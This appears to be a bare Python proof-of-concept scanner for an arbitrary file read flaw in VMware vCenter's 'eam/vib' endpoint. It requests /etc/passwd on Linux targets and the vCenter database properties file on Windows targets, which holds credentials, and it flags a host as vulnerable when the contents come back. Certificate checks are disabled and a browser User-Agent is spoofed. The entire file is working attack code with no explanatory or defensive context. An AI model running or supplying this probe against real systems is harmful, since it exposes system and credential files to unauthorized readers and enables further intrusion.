import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"eam/vib?id=/etc/passwd"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:[x*]:0:0:",response.text):
		linux0=True
	else:
		linux0=False
	url=baseurl+"eam/vib?id=C:/ProgramData/VMware/vCenterServer/cfg/vmware-vpx/vcdb.properties"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "org.postgresql.Driver" in response.text:
		win0=True
	else:
		win0=False
	if win0 or linux0:
		return True
	else:
		return False
